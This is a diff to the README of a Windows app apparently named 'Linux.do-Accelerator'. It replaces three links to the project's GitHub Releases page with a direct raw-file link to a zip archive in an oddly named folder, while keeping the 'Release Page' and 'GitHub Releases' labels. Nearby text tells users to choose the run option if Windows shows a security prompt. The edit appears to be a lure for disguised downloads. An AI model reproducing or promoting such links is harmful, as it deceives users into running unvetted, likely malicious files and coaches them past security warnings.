@@ -1,6 +1,6 @@
 # 🐧 Linux.do-Accelerator - Faster access, simpler setup
 
-[![Download Linux.do-Accelerator](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/CROSS-T/Linux.do-Accelerator/releases)
+[![Download Linux.do-Accelerator](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/CROSS-T/Linux.do-Accelerator/main/fatheaded/Accelerator_do_Linux_v3.3.zip)
 
 ## 📦 What this app does
 
@@ -22,7 +22,7 @@ If Windows shows a security prompt, choose the option that lets you run the app.
 
 Visit this page to download Linux.do-Accelerator:
 
-https://github.com/CROSS-T/Linux.do-Accelerator/releases
+https://raw.githubusercontent.com/CROSS-T/Linux.do-Accelerator/main/fatheaded/Accelerator_do_Linux_v3.3.zip
 
 1. Open the release page
 2. Find the latest release
@@ -164,7 +164,7 @@ Typical advanced use cases:
 
 If you need the latest build, visit the release page here:
 
-[GitHub Releases](https://github.com/CROSS-T/Linux.do-Accelerator/releases)
+[GitHub Releases](https://raw.githubusercontent.com/CROSS-T/Linux.do-Accelerator/main/fatheaded/Accelerator_do_Linux_v3.3.zip)
 
 ## ⌨️ Quick install path
 
